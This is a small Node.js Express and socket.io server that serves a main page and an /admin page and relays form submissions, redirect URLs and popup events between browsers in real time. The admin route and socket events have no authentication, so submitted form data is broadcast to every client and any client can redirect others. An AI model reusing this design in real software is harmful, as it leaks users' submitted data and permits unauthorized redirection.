const express = require('express');
const http = require('http');
const path = require('path');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(express.static(path.join(__dirname, 'public')));

// Handle root route
app.get('/', (req, res) => {
  // Send the index.html file
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle admin route
app.get('/admin', (req, res) => {
  // Send the admin.html file
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});


io.on('connection', (socket) => {
    console.log('A user connected');

    socket.on('formSubmit', (data) => {
        socket.broadcast.emit('updateTable', data)
    });

    socket.on('redirect', (data, url) => {
        socket.broadcast.emit('redirect', data, url)
    });

    socket.on('finish', (data, link) => {
        io.emit('closePopup', data, link)
    });

    socket.on('popupClose', (data) => {
        io.emit('closePopup', data, '')
    });

    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

server.listen(process.env.PORT || 5000)